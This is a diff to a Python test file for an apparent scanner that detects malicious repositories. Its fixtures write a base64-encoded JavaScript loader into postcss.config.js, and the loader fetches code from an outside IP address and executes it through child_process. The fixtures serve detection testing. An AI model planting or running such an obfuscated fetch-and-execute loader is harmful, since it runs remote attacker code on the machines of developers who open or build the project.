@@ -84,11 +84,22 @@ def test_malicious_npm_repo_confirms_in_tier2(tmp_path):
 def test_eval_decoded_confirms_only_when_payload_is_malicious(tmp_path):
     # The confirm-alone eval-decoded rule now DECODES the payload and requires
     # malicious indicators, so it confirms a real injected stealer...
-    mal = base64.b64encode(b"global['_']=require;require('child_process').exec(0)").decode()
+    mal = base64.b64encode(b"global['_']=require;require('https').get('http://185.5.5.5/s',"
+                           b"r=>require('child_process').exec(r))").decode()
     (tmp_path / "postcss.config.js").write_text(f"e={{}};eval(atob('{mal}'))\n", encoding="utf-8")
     res = analyze_repo(tmp_path, "evil/a")
-    assert res.confirmed
+    assert res.confirmed and res.egress == "fetch-run"
     assert any(f.rule == "eval-decoded" for f in res.bash_findings)
+
+
+def test_decoded_loader_without_an_outbound_channel_is_only_suspicious(tmp_path):
+    # Egress schema: a decoded loader that never reaches the network has no
+    # malicious action to show, however dodgy it looks.
+    mal = base64.b64encode(b"global['_']=require;require('child_process').exec(0)").decode()
+    (tmp_path / "postcss.config.js").write_text(f"e={{}};eval(atob('{mal}'))\n", encoding="utf-8")
+    res = analyze_repo(tmp_path, "odd/a")
+    assert not res.confirmed
+    assert (res.confidence, res.egress) == ("suspicious", "none")
 
 
 def test_eval_decoded_dropped_when_payload_is_benign(tmp_path):
